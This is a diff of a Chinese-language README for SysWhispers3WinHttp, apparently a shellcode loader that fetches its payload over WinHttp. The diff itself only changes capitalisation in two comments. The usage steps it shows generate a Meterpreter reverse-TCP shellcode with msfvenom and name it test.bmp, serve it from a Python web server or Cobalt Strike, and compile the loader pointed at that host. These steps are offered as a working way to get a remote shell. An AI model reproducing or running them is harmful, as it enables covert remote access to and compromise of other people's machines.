@@ -8,10 +8,10 @@ SysWhispers3WinHttp 基于SysWhispers3项目增添WinHttp分离加载功能并�
 ## 0x02 使用：
 
 ```
-// 1. 使用msfvenom生成shellcode（或使用CobaltStrike生成Stageless之shellcode）
+// 1. 使用msfvenom生成shellcode（或使用CobaltStrike生成Stageless之Shellcode）
 msfvenom -p windows/meterpreter_reverse_tcp lhost=192.168.1.104 lport=4444 -f raw -o test.bmp
 
-// 2. 使用python3开启Web服务（或使用CobaltStrike之Host File功能）
+// 2. 使用python3开启Web服务（或使用CobaltStrike之HostFile功能）
 python3 -m http.server
 
 // 3. 修改SysWhispers3WinHttp.c 第40行IP地址并使用32位GCC进行编译
